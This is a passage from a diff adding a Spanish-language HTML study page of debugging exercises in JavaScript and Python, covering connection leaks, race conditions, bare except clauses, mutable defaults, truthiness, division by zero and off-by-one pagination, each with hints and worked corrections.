+<span class="kw">const</span> r = <span class="kw">await</span> <span class="fn">obtenerTodo</span>(urls);
+console.<span class="fn">assert</span>(r.length === <span class="num">3</span>); <span class="cmt">// los 3 OK, el 404 se excluye</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 1.3 -->
+<article class="exercise" data-ex="1.3">
+  <div class="ex-head">
+    <h4>Ejercicio 1.3 — Conexión DB sin finally</h4>
+    <span class="badge">Recursos</span>
+    <span class="tag js">JS</span>
+    <span class="diff d2">Media</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Tras horas de tráfico, la aplicación deja de responder. El pool de conexiones se agota.</p>
+<pre><code><span class="kw">async function</span> <span class="fn">getUser</span>(id) {
+  <span class="kw">const</span> client = <span class="kw">await</span> pool.<span class="fn">connect</span>();
+  <span class="kw">const</span> result = <span class="kw">await</span> client.<span class="fn">query</span>(<span class="str">"SELECT * FROM users WHERE id = $1"</span>, [id]);
+  <span class="kw">return</span> result.rows[<span class="num">0</span>];
+}</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> ¿Qué pasa si <code>client.query()</code> lanza una excepción? ¿Se libera la conexión? ¿Dónde debería estar <code>client.release()</code> para garantizarse siempre?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Sigue el camino con <code>throw</code> entre <code>getConnection()</code> y <code>release()</code>. Preguntate: en que camino el <code>release()</code> nunca corre?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> La conexión nunca se libera al pool. Si la query falla, <code>client.release()</code> ni siquiera existe en el código, y aunque existiera sin <code>finally</code>, no se ejecutaría en caso de error.</p>
+    <p><strong>2. ¿Por qué falla?</strong> Cada <code>pool.connect()</code> toma una conexión del pool. Sin <code>client.release()</code> en un bloque <code>finally</code>, la conexión se queda ocupada para siempre. Tras N errores, el pool (típicamente 10-20 conexiones) se agota.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Tras el primer error de query (constraint violation, timeout, etc.). Progresivamente todas las requests se bloquean esperando una conexión disponible.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">async function</span> <span class="fn">getUser</span>(id) {
+  <span class="kw">const</span> client = <span class="kw">await</span> pool.<span class="fn">connect</span>();
+  <span class="kw">try</span> {
+    <span class="kw">const</span> result = <span class="kw">await</span> client.<span class="fn">query</span>(<span class="str">"SELECT * FROM users WHERE id = $1"</span>, [id]);
+    <span class="kw">return</span> result.rows[<span class="num">0</span>];
+  } <span class="kw">finally</span> {
+    client.<span class="fn">release</span>();
+  }
+}</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="cmt">// Simular error y verificar que el pool no se agota</span>
+<span class="kw">for</span> (<span class="kw">let</span> i = <span class="num">0</span>; i &lt; <span class="num">50</span>; i++) {
+  <span class="kw">try</span> { <span class="kw">await</span> <span class="fn">getUser</span>(<span class="str">"invalid-id"</span>); } <span class="kw">catch</span>(e) {}
+}
+<span class="cmt">// El pool debería seguir teniendo conexiones disponibles</span>
+console.<span class="fn">assert</span>(pool.totalCount === pool.idleCount);</code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 1.4 -->
+<article class="exercise" data-ex="1.4">
+  <div class="ex-head">
+    <h4>Ejercicio 1.4 — Race condition en contador</h4>
+    <span class="badge">Concurrencia</span>
+    <span class="tag js">JS</span>
+    <span class="diff d3">Dificil</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>10 llamadas simultáneas a incrementar deberían dar 10, pero a veces da 1.</p>
+<pre><code><span class="kw">let</span> contador = <span class="num">0</span>;
+
+<span class="kw">async function</span> <span class="fn">incrementar</span>() {
+  <span class="kw">const</span> actual = contador;
+  <span class="kw">await</span> <span class="fn">simularLatencia</span>(); <span class="cmt">// 10-100ms</span>
+  contador = actual + <span class="num">1</span>;
+}
+
+<span class="cmt">// Uso:</span>
+Promise.<span class="fn">all</span>(Array(<span class="num">10</span>).fill(<span class="num">0</span>).<span class="fn">map</span>(() =&gt; <span class="fn">incrementar</span>()));
+console.<span class="fn">log</span>(contador); <span class="cmt">// esperado: 10, obtenido: 1</span></code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> Todas las llamadas leen <code>contador</code> antes del <code>await</code>. ¿Qué valor leen las 10? Después del <code>await</code>, ¿a cuánto escriben? Es el clásico patrón read-modify-write sin atomicidad.</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Fijate que las 10 llamadas leen <code>contador</code> ANTES del <code>await</code>. Preguntate: que valor leen las 10 si ninguna escribio todavia?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> Las 10 llamadas leen <code>contador = 0</code> antes del await, y después del await todas escriben <code>0 + 1 = 1</code>. Es una race condition clásica.</p>
+    <p><strong>2. ¿Por qué falla?</strong> El patrón read-modify-write no es atómico. Entre la lectura (<code>const actual = contador</code>) y la escritura (<code>contador = actual + 1</code>), el event loop ejecuta otras microtasks. Las 10 funciones leen el mismo valor antes de que cualquiera escriba.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Siempre que haya concurrencia real (múltiples llamadas antes de que la primera termine de escribir). En Node.js con operaciones async (DB, red, timers).</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="cmt">// Opción A: Mutex/lock simple</span>
+<span class="kw">let</span> contador = <span class="num">0</span>;
+<span class="kw">let</span> lock = Promise.<span class="fn">resolve</span>();
+
+<span class="kw">async function</span> <span class="fn">incrementar</span>() {
+  <span class="kw">const</span> prev = lock;
+  <span class="kw">let</span> release;
+  lock = <span class="kw">new</span> Promise(r =&gt; release = r);
+  <span class="kw">await</span> prev;
+  <span class="kw">try</span> {
+    contador++;
+  } <span class="kw">finally</span> {
+    <span class="fn">release</span>();
+  }
+}
+
+<span class="cmt">// Opción B (mejor): usar un contador atómico sin await en medio</span>
+<span class="kw">let</span> contador = <span class="num">0</span>;
+<span class="kw">function</span> <span class="fn">incrementar</span>() {
+  contador++; <span class="cmt">// síncrono, no hay race condition</span>
+}</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="kw">await</span> Promise.<span class="fn">all</span>(Array(<span class="num">10</span>).fill(<span class="num">0</span>).<span class="fn">map</span>(() =&gt; <span class="fn">incrementar</span>()));
+console.<span class="fn">assert</span>(contador === <span class="num">10</span>);</code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+</section>
+
+<!-- ===================== MÓDULO 2 ===================== -->
+<section id="m2">
+<h2>🐍 Módulo 2 — Python: tipos, excepciones, mutabilidad</h2>
+
+<h3>Teoría esencial</h3>
+
+<h4>Los 3 pecados capitales de Python</h4>
+<table>
+  <tr><th>Pecado</th><th>Ejemplo</th><th>Consecuencia</th></tr>
+  <tr><td><code>except:</code> desnudo</td><td><code>except: pass</code></td><td>Captura KeyboardInterrupt, SystemExit, errores de typo</td></tr>
+  <tr><td>Default mutable</td><td><code>def f(items=[])</code></td><td>La lista se comparte entre TODAS las llamadas</td></tr>
+  <tr><td>Truthiness ingenua</td><td><code>if valor:</code></td><td>0, "", [], {}, None, False son todos falsy</td></tr>
+</table>
+
+<h4>Radar de 6 patrones bug-prone en Python</h4>
+<div class="radar">
+  <div class="radar-item"><strong>except desnudo</strong> — traga errores que no debería</div>
+  <div class="radar-item"><strong>Default mutable</strong> — estado compartido entre llamadas</div>
+  <div class="radar-item"><strong>Truthiness</strong> — 0 y "" son falsy legítimos</div>
+  <div class="radar-item"><strong>is vs ==</strong> — is compara identidad, no valor</div>
+  <div class="radar-item"><strong>Mutación en iteración</strong> — modificar lista mientras se itera</div>
+  <div class="radar-item"><strong>Imports circulares</strong> — módulos que se importan entre sí</div>
+</div>
+
+<div class="theory">
+  <h4>📚 Teoría M2 — Excepciones, mutabilidad y truthiness (léeme antes de los ejercicios)</h4>
+  <p>En Python los 3 suspensos clásicos son: tragar errores con <code>except:</code>, compartir estado con defaults mutables, y confundir "falsy" con "ausente". Los tres se detectan con la misma pregunta: <strong>¿qué valores concretos pueden llegar aquí?</strong></p>
+  <h5>1. Excepciones: captura lo específico, nunca lo desnudo</h5>
+  <ul>
+    <li><code>except:</code> captura hasta <code>KeyboardInterrupt</code> y <code>SystemExit</code>, y esconde typos (NameError) que deberían crashear en desarrollo.</li>
+    <li>Patrón examen: <code>except (ValueError, TypeError):</code> + log del input + valor por defecto documentado. Y si no sabes recuperarte, <strong>no captures</strong>.</li>
+    <li><code>try/except/else/finally</code>: el <code>else</code> corre solo si no hubo excepción (ideal para separar "parseo" de "uso").</li>
+  </ul>
+  <h5>2. Defaults mutables: el objeto se crea UNA vez</h5>
+  <ul>
+    <li><code>def f(cache={})</code>: ese dict se crea al definir la función y se <strong>comparte entre todas las llamadas</strong>. Fuga de datos entre usuarios.</li>
+    <li>Patrón: <code>def f(cache=None): cache = {} if cache is None else cache</code>. Lo mismo para <code>[]</code> y <code>set()</code>.</li>
+    <li>Variante en clases: atributo de clase mutable vs atributo de instancia. Si lo mutas en instancia, contamina a todas.</li>
+  </ul>
+  <h5>3. Truthiness: 0 es un valor, no una ausencia</h5>
+  <ul>
+    <li>Falsy: <code>None, False, 0, 0.0, "", [], {}, set()</code>. Todo lo demás es truthy.</li>
+    <li><code>if porcentaje:</code> trata <code>0</code> como "no proporcionado". Para opcionales usa centinela: <code>def f(x=None): if x is not None:</code>.</li>
+    <li>En paginación <code>offset=0</code> es válido; en descuentos <code>0%</code> es válido. Si tu check los descarta, el bug es conceptual aunque el número "coincida".</li>
+  </ul>
+</div>
+
+<ul class="goals">
+  <li>Distingues <code>except:</code> de <code>except (ValueError, TypeError):</code> y sabes qué traga cada uno.</li>
+  <li>Ves un default mutable y lo corriges con centinela <code>None</code> sin pensar.</li>
+  <li>Nunca usas <code>if x:</code> para detectar "parámetro omitido" con valores 0/"" válidos.</li>
+</ul>
+
+<h3>Ejemplo resuelto 0.1 — Carrito con items=[] compartido</h3>
+<pre><code><span class="kw">class</span> <span class="fn">Carrito</span>:
+    <span class="kw">def</span> <span class="fn">__init__</span>(self, items=[]):
+        self.items = items
+
+c1 = Carrito()
+c1.items.append(<span class="str">"manzana"</span>)
+c2 = Carrito()
+c2.items.append(<span class="str">"pera"</span>)
+<span class="fn">print</span>(c1.items)  <span class="cmt"># ["manzana", "pera"] — ¡compartido!</span></code></pre>
+
+<!-- Ejercicio 2.1 -->
+<article class="exercise" data-ex="2.1">
+  <div class="ex-head">
+    <h4>Ejercicio 2.1 — Parser de precios con except desnudo</h4>
+    <span class="badge">Excepciones</span>
+    <span class="tag py">PY</span>
+    <span class="diff d1">Facil</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Este parser convierte strings a precios. Cuando recibe <code>None</code>, devuelve 0.0 silenciosamente. El equipo de datos no sabe que hay nulls en la base.</p>
+<pre><code><span class="kw">def</span> <span class="fn">parse_precio</span>(texto):
+    <span class="kw">try</span>:
+        limpio = texto.strip().replace(<span class="str">"$"</span>, <span class="str">""</span>).replace(<span class="str">","</span>, <span class="str">""</span>)
+        <span class="kw">return</span> <span class="fn">float</span>(limpio)
+    <span class="kw">except</span>:
+        <span class="kw">return</span> <span class="num">0.0</span></code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> ¿Qué captura un <code>except:</code> sin tipo? Si <code>texto</code> es <code>None</code>, ¿qué excepción lanza <code>None.strip()</code>? ¿Y si el usuario presiona Ctrl+C durante el procesamiento? ¿Se captura también?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Cuenta que errores lanza <code>float()</code> con None, texto o Infinity. Preguntate: cuales deberian ser 0 y cuales deberian crashear?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> El <code>except:</code> desnudo captura TODAS las excepciones, incluyendo <code>TypeError</code> (cuando texto es None), <code>KeyboardInterrupt</code> y <code>SystemExit</code>. Devuelve 0.0 sin distinguir entre "formato inválido" y "error grave".</p>
+    <p><strong>2. ¿Por qué falla?</strong> En Python, <code>except:</code> sin tipo equivale a <code>except BaseException:</code>. Captura incluso <code>KeyboardInterrupt</code> y <code>SystemExit</code>, haciendo el proceso imposible de matar limpiamente. Además, enmascara bugs de programación (como pasar None) que deberían fallar rápido.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Cuando llega un <code>None</code> de la BD, cuando hay un typo en el código dentro del try, o cuando el usuario intenta cancelar el proceso.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">def</span> <span class="fn">parse_precio</span>(texto):
+    <span class="kw">if</span> texto <span class="kw">is None</span>:
+        <span class="kw">raise</span> ValueError(<span class="str">"Precio no puede ser None"</span>)
+    <span class="kw">try</span>:
+        limpio = texto.strip().replace(<span class="str">"$"</span>, <span class="str">""</span>).replace(<span class="str">","</span>, <span class="str">""</span>)
+        <span class="kw">return</span> <span class="fn">float</span>(limpio)
+    <span class="kw">except</span> (ValueError, AttributeError) <span class="kw">as</span> e:
+        <span class="kw">raise</span> ValueError(<span class="str">f"Precio inválido: {texto!r}"</span>) <span class="kw">from</span> e</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="kw">assert</span> <span class="fn">parse_precio</span>(<span class="str">"$1,234.56"</span>) == <span class="num">1234.56</span>
+<span class="kw">try</span>:
+    <span class="fn">parse_precio</span>(<span class="kw">None</span>)
+    <span class="kw">assert</span> <span class="kw">False</span>, <span class="str">"Debería lanzar"</span>
+<span class="kw">except</span> ValueError:
+    <span class="kw">pass</span>
+<span class="kw">try</span>:
+    <span class="fn">parse_precio</span>(<span class="str">"abc"</span>)
+    <span class="kw">assert</span> <span class="kw">False</span>
+<span class="kw">except</span> ValueError:
+    <span class="kw">pass</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 2.2 -->
+<article class="exercise" data-ex="2.2">
+  <div class="ex-head">
+    <h4>Ejercicio 2.2 — Caché compartido entre usuarios</h4>
+    <span class="badge">Mutabilidad</span>
+    <span class="tag py">PY</span>
+    <span class="diff d2">Media</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Esta función cachea resultados de consultas. Pero los usuarios empiezan a ver datos de otros usuarios.</p>
+<pre><code><span class="kw">def</span> <span class="fn">obtener_datos</span>(usuario_id, cache={}):
+    <span class="kw">if</span> usuario_id <span class="kw">not in</span> cache:
+        cache[usuario_id] = db.<span class="fn">query</span>(<span class="str">"SELECT * FROM datos WHERE user_id = %s"</span>, usuario_id)
+    <span class="kw">return</span> cache[usuario_id]</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> ¿Cuántas veces se evalúa el default <code>cache={}</code>? ¿Es una lista nueva por llamada o se evalúa una sola vez? ¿Qué implica eso para múltiples llamadas a la función?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Busca donde se crea el <code>{}</code> del default y cuantas veces se evalua. Preguntate: es un dict nuevo por llamada o el mismo siempre?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> El diccionario <code>cache={}</code> como argumento por defecto se crea UNA SOLA VEZ cuando Python define la función. Todas las llamadas comparten el mismo diccionario.</p>
+    <p><strong>2. ¿Por qué falla?</strong> Los argumentos por defecto en Python se evalúan una sola vez, en tiempo de definición de la función. El objeto mutable (dict) persiste entre llamadas. Esto es un patrón bien conocido pero peligroso.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Desde la segunda llamada. Si el usuario A se cachea primero, y luego el usuario B tiene el mismo ID en otro contexto, o si el cache crece sin límite causando memory leak.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">def</span> <span class="fn">obtener_datos</span>(usuario_id, cache=<span class="kw">None</span>):
+    <span class="kw">if</span> cache <span class="kw">is None</span>:
+        cache = {}
+    <span class="kw">if</span> usuario_id <span class="kw">not in</span> cache:
+        cache[usuario_id] = db.<span class="fn">query</span>(
+            <span class="str">"SELECT * FROM datos WHERE user_id = %s"</span>, usuario_id
+        )
+    <span class="kw">return</span> cache[usuario_id]
+
+<span class="cmt"># O mejor: usar un caché con TTL y límite</span>
+<span class="kw">from</span> functools <span class="kw">import</span> lru_cache
+<span class="kw">import</span> time</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code>c1 = {}
+r1 = <span class="fn">obtener_datos</span>(<span class="str">"user_a"</span>, cache=c1)
+r2 = <span class="fn">obtener_datos</span>(<span class="str">"user_b"</span>, cache=c1)
+<span class="kw">assert</span> <span class="str">"user_a"</span> <span class="kw">in</span> c1
+<span class="kw">assert</span> <span class="str">"user_b"</span> <span class="kw">in</span> c1
+<span class="cmt"># Sin pasar cache, cada llamada tiene su propio dict</span>
+r3 = <span class="fn">obtener_datos</span>(<span class="str">"user_c"</span>)
+r4 = <span class="fn">obtener_datos</span>(<span class="str">"user_d"</span>)
+<span class="cmt"># r3 y r4 no comparten estado</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 2.3 -->
+<article class="exercise" data-ex="2.3">
+  <div class="ex-head">
+    <h4>Ejercicio 2.3 — if porcentaje: descarta el 0%</h4>
+    <span class="badge">Truthiness</span>
+    <span class="tag py">PY</span>
+    <span class="diff d1">Facil</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Esta función aplica un descuento. Cuando el descuento es exactamente 0% (sin descuento), el sistema lo trata como si no se hubiera pasado el parámetro y usa el default del 10%.</p>
+<pre><code><span class="kw">def</span> <span class="fn">aplicar_descuento</span>(precio, porcentaje=<span class="num">10</span>):
+    <span class="kw">if</span> porcentaje:
+        <span class="kw">return</span> precio * (<span class="num">1</span> - porcentaje / <span class="num">100</span>)
+    <span class="kw">return</span> precio</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> En Python, <code>bool(0)</code> es <code>False</code>. Si alguien llama <code>aplicar_descuento(100, 0)</code> para indicar "sin descuento", ¿qué rama se ejecuta? ¿Es 0 un valor válido o significa "no proporcionado"?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Prueba <code>aplicar_descuento(100, 0)</code> y mira que rama toma el <code>if porcentaje:</code>. Preguntate: 0 significa omitido o cero real?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> Cuando <code>porcentaje=0</code>, <code>if porcentaje:</code> evalúa a <code>False</code> (porque 0 es falsy), y la función retorna el precio sin descuento en lugar de aplicar el 0% (que matemáticamente es lo mismo, pero el problema es cuando 0 es un valor legítimo que se confunde con "no proporcionado").</p>
+    <p><strong>2. ¿Por qué falla?</strong> Python trata 0, "", [], {}, None y False como falsy. Usar <code>if valor:</code> para verificar "si se proporcionó un parámetro" falla cuando el valor válido es 0.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Cuando el caller pasa explícitamente 0 para indicar "sin descuento". El resultado es correcto matemáticamente (precio * 1 = precio), pero el bug es conceptual: el código no distingue entre "no pasado" y "pasado como 0". En otros contextos (ej: offset=0 en paginación) sería un bug funcional.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">def</span> <span class="fn">aplicar_descuento</span>(precio, porcentaje=<span class="kw">None</span>):
+    <span class="kw">if</span> porcentaje <span class="kw">is not None</span>:
+        <span class="kw">if</span> <span class="kw">not</span> (<span class="num">0</span> &lt;= porcentaje &lt;= <span class="num">100</span>):
+            <span class="kw">raise</span> ValueError(<span class="str">f"Porcentaje inválido: {porcentaje}"</span>)
+        <span class="kw">return</span> precio * (<span class="num">1</span> - porcentaje / <span class="num">100</span>)
+    <span class="kw">return</span> precio * <span class="num">0.9</span>  <span class="cmt"># default 10%</span></code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="kw">assert</span> <span class="fn">aplicar_descuento</span>(<span class="num">100</span>, <span class="num">0</span>) == <span class="num">100</span>    <span class="cmt"># 0% = sin descuento</span>
+<span class="kw">assert</span> <span class="fn">aplicar_descuento</span>(<span class="num">100</span>, <span class="num">50</span>) == <span class="num">50</span>   <span class="cmt"># 50% descuento</span>
+<span class="kw">assert</span> <span class="fn">aplicar_descuento</span>(<span class="num">100</span>) == <span class="num">90</span>      <span class="cmt"># default 10%</span>
+<span class="kw">assert</span> <span class="fn">aplicar_descuento</span>(<span class="num">100</span>, <span class="num">100</span>) == <span class="num">0</span>  <span class="cmt"># 100% = gratis</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+</section>
+
+<!-- ===================== MÓDULO 3 ===================== -->
+<section id="m3">
+<h2>🧩 Módulo 3 — Edge cases y algoritmos</h2>
+
+<h3>Teoría esencial</h3>
+<h4>Categorías de edge cases</h4>
+<table>
+  <tr><th>Categoría</th><th>Ejemplo</th><th>Bug típico</th></tr>
+  <tr><td>Colección vacía</td><td>[], {}, ""</td><td>IndexError, división por cero</td></tr>
+  <tr><td>Un solo elemento</td><td>[42]</td><td>Lógica "entre elementos" falla</td></tr>
+  <tr><td>Límites numéricos</td><td>0, -1, MAX_INT</td><td>Off-by-one, overflow</td></tr>
+  <tr><td>Off-by-one</td><td>índices, rangos</td><td>&lt; vs &lt;=, inicio/fin incorrectos</td></tr>
+  <tr><td>Duplicados</td><td>[1,1,2,2]</td><td>Sets vs lists, conteos erróneos</td></tr>
+  <tr><td>Tipos mixtos</td><td>[1, "1", null]</td><td>Comparaciones, sorting</td></tr>
+  <tr><td>Divisiones</td><td>x / 0, x % 0</td><td>ZeroDivisionError</td></tr>
+</table>
+
+<div class="theory">
+  <h4>📚 Teoría M3 — El checklist de límites que el evaluador sí pasa (léeme antes de los ejercicios)</h4>
+  <p>El 80% de los "edge cases" del examen son 7 casos. Memoriza la lista y pásala mentalmente a cada función: <strong>vacío, uno, cero, negativo, enorme, duplicado, mixto</strong>. Si tu corrección no dice qué hace en cada uno, está incompleta.</p>
+  <h5>1. Off-by-one: el bug más rentable del examen</h5>
+  <ul>
+    <li>En Python <code>lista[a:b]</code> excluye <code>b</code>. Para N elementos desde <code>i</code>: <code>[i:i+N]</code>, nunca <code>[i:i+N-1]</code>.</li>
+    <li>En paginación verifica siempre: página 0 empieza en 0, no hay gaps (0-9, 10-19) ni overlaps, y la última página parcial funciona.</li>
+    <li>En bucles: <code>range(n)</code> da 0..n-1. Si quieres 1..n, es <code>range(1, n+1)</code>.</li>
+  </ul>
+  <h5>2. División por cero y el caso 0→X</h5>
+  <ul>
+    <li><code>(actual - anterior) / anterior</code> explota con <code>anterior=0</code>. Decide el contrato: 0→0 = 0%, 0→X = infinito o error documentado. Lo que suspende es <strong>no decidir</strong>.</li>
+    <li>Lo mismo para promedios (<code>sum([])/len([])</code>), ratios y porcentajes. Guarda vacía primero.</li>
+  </ul>
+  <h5>3. Búsqueda binaria: invariante o loop infinito</h5>
+  <ul>
+    <li>Invariante: el target, si existe, siempre está en <code>[izq, der]</code>. Cada iteración debe <strong>achicar</strong> el intervalo: <code>izq = medio + 1</code> o <code>der = medio - 1</code>.</li>
+    <li><code>izq = medio</code> no achica cuando <code>medio == izq</code> → loop infinito con 2 elementos. Señal de humo: "se cuelga cuando el elemento no está".</li>
+    <li>Verificación mínima: encontrado, no encontrado, vacío, un elemento, duplicados.</li>
+  </ul>
+</div>
+
+<ul class="goals">
+  <li>Pasas el checklist vacío/uno/cero/negativo/enorme/duplicado/mixto a cada función.</li>
+  <li>Corriges slices y rangos sin dudar (exclusivo vs inclusivo).</li>
+  <li>Enuncias el invariante de búsqueda binaria y garantizas progreso del loop.</li>
+</ul>
+
+<h3>Ejemplo resuelto 0.2 — Promedio de lista vacía</h3>
+<pre><code><span class="kw">def</span> <span class="fn">promedio</span>(numeros):
+    <span class="kw">return</span> <span class="fn">sum</span>(numeros) / <span class="fn">len</span>(numeros)  <span class="cmt"># ZeroDivisionError si numeros=[]</span></code></pre>
+
+<!-- Ejercicio 3.1 -->
+<article class="exercise" data-ex="3.1">
+  <div class="ex-head">
+    <h4>Ejercicio 3.1 — Crecimiento porcentual con división por cero</h4>
+    <span class="badge">Edge cases</span>
+    <span class="tag py">PY</span>
+    <span class="diff d1">Facil</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Calcula el crecimiento porcentual entre dos períodos. Cuando el valor anterior es 0, crashea.</p>
+<pre><code><span class="kw">def</span> <span class="fn">crecimiento_porcentual</span>(anterior, actual):
+    <span class="kw">return</span> ((actual - anterior) / anterior) * <span class="num">100</span></code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> ¿Qué pasa cuando <code>anterior = 0</code>? ¿Y cuando ambos son 0? ¿Cuál es el crecimiento porcentual cuando pasas de 0 a 100? ¿Es definible matemáticamente?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Prueba <code>anterior=0, actual=100</code> y <code>anterior=0, actual=0</code>. Preguntate: que contrato (inf, 0 o error) documentarias?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> <code>ZeroDivisionError</code> cuando <code>anterior = 0</code>. Además, no valida tipos ni rangos.</p>
+    <p><strong>2. ¿Por qué falla?</strong> La fórmula de crecimiento porcentual <code>(actual - anterior) / anterior</code> tiene una singularidad cuando anterior=0. Matemáticamente, pasar de 0 a cualquier valor positivo es un crecimiento infinito/no definido.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> En el primer período de un producto nuevo (ventas anteriores = 0), o cuando se reinician contadores.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">def</span> <span class="fn">crecimiento_porcentual</span>(anterior, actual):
+    <span class="kw">if</span> anterior == <span class="num">0</span> <span class="kw">and</span> actual == <span class="num">0</span>:
+        <span class="kw">return</span> <span class="num">0.0</span>     <span class="cmt"># sin cambio</span>
+    <span class="kw">if</span> anterior == <span class="num">0</span>:
+        <span class="kw">return</span> <span class="fn">float</span>(<span class="str">'inf'</span>)  <span class="cmt"># crecimiento infinito</span>
+    <span class="kw">return</span> ((actual - anterior) / anterior) * <span class="num">100</span></code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="kw">assert</span> <span class="fn">crecimiento_porcentual</span>(<span class="num">100</span>, <span class="num">150</span>) == <span class="num">50.0</span>
+<span class="kw">assert</span> <span class="fn">crecimiento_porcentual</span>(<span class="num">0</span>, <span class="num">0</span>) == <span class="num">0.0</span>
+<span class="kw">assert</span> <span class="fn">crecimiento_porcentual</span>(<span class="num">0</span>, <span class="num">100</span>) == <span class="fn">float</span>(<span class="str">'inf'</span>)
+<span class="kw">assert</span> <span class="fn">crecimiento_porcentual</span>(<span class="num">200</span>, <span class="num">100</span>) == -<span class="num">50.0</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 3.2 -->
+<article class="exercise" data-ex="3.2">
+  <div class="ex-head">
+    <h4>Ejercicio 3.2 — Paginación con off-by-one</h4>
+    <span class="badge">Off-by-one</span>
+    <span class="tag py">PY</span>
+    <span class="diff d2">Media</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Paginación de resultados. El cálculo del índice final tiene un error que causa duplicación o pérdida de elementos entre páginas.</p>
+<pre><code><span class="kw">def</span> <span class="fn">paginar</span>(items, pagina, por_pagina=<span class="num">10</span>):
+    inicio = pagina * por_pagina
+    fin = inicio + por_pagina - <span class="num">1</span>
+    <span class="kw">return</span> items[inicio:fin]</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> En Python, los slices <code>lista[a:b]</code> son exclusivos en el límite superior. Si quieres 10 elementos empezando en 0, ¿cuál es el slice correcto: <code>[0:9]</code> o <code>[0:10]</code>? ¿Cuántos elementos devuelve <code>[0:9]</code>?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Cuenta los elementos de <code>items[0:9]</code> vs <code>items[0:10]</code>. Preguntate: el limite superior del slice es inclusivo o exclusivo?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> El <code>-1</code> en <code>fin = inicio + por_pagina - 1</code> causa que cada página devuelva un elemento menos. Con <code>por_pagina=10</code>, solo devuelve 9.</p>
+    <p><strong>2. ¿Por qué falla?</strong> El autor confunde la semántica de slices de Python con índices inclusivos. En Python, <code>lista[a:b]</code> va desde el índice <code>a</code> hasta <code>b-1</code> (b exclusivo). Para obtener 10 elementos desde <code>inicio</code>, el slice es <code>[inicio:inicio+10]</code>, no <code>[inicio:inicio+9]</code>.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Siempre. Cada página pierde el último elemento. La página 0 devuelve items[0:9] (9 elementos en vez de 10).</p>
